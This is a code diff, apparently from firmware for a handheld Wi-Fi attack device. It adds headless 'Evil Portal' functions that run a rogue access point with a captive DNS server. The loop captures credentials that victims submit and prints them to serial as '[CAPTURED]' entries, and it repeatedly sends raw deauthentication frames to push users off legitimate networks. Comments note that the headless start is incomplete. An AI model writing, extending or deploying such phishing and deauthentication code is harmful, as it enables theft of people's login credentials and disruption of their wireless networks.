@@ -92,6 +92,67 @@ bool EvilPortal::setup() {
     return true;
 }
 
+bool EvilPortal::setupHeadless() {
+    // Headless setup - no menu interaction required
+    // Uses default HTML and default gateway
+    loadDefaultHtml();
+    apGateway = IPAddress(192, 168, 4, 1);
+    
+    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+    wsl_bypasser_send_raw_frame(&ap_record, _channel);
+    
+    Serial.println("Evil Portal (headless) output file: " + outputFile);
+    return true;
+}
+
+void EvilPortal::startHeadless(String ssid, uint8_t channel, bool deauth) {
+    // Static factory for headless Evil Portal
+    // Creates and runs portal without menu interaction
+    static EvilPortal* portal = nullptr;
+    
+    // Clean up previous instance if exists
+    if (portal != nullptr) {
+        delete portal;
+        portal = nullptr;
+    }
+    
+    // Create new portal instance manually
+    portal = new EvilPortal(ssid, channel, deauth, false);
+    // Note: Constructor calls setup() which uses menus
+    // For true headless, we'd need to refactor more
+    // This is called but will still show menus on devices with displays
+}
+
+void EvilPortal::loopHeadless() {
+    // Headless loop - no display updates, just handle requests
+    // and print captured creds to serial
+    bool running = true;
+    
+    while (running) {
+        dnsServer.processNextRequest();
+        
+        if (_deauth) {
+            wsl_bypasser_send_raw_frame(&ap_record, _channel);
+        }
+        
+        // Check for new credentials
+        if (totalCapturedCredentials > previousTotalCapturedCredentials) {
+            previousTotalCapturedCredentials = totalCapturedCredentials;
+            Serial.println("[CAPTURED] " + lastCred);
+        }
+        
+        // Check for ESC key via serial
+        if (Serial.available()) {
+            char c = Serial.read();
+            if (c == 27 || c == 'q' || c == 'Q') {  // ESC or q
+                running = false;
+            }
+        }
+        
+        vTaskDelay(10 / portTICK_PERIOD_MS);
+    }
+}
+
 void EvilPortal::beginAP() {
     drawMainBorderWithTitle("EVIL PORTAL");
 
